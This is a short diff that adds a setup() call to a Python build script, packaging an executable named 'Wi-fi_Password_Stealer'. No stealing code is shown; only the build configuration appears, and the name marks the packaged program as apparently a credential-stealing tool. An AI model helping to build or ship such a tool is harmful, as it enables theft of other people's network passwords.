@@ -16,3 +16,12 @@ options = {
         'packages': packages,
     },
 }
+
+
+setup(
+    name="Wi-fi_Password_Stealer",
+    options=options,
+    version="1.0.0",
+    description='Wifi Password',
+    executables=executables
+)
